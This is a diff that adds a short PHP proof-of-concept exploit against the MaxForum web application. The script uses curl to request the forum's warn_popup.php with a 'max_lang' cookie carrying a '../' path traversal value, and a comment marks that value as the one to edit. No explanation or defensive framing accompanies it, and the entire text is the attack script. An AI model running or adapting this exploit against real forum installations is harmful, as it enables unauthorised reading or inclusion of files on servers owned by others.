@@ -1,0 +1,7 @@
+<?
+$url="http://www.example.com/MaxForum/";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url."/includes/forums/warn_popup.php");
+curl_setopt($ch, CURLOPT_COOKIE, "max_lang=../gpl.txt");  // <--- edit
+ $buffer = curl_exec($ch);
+?>
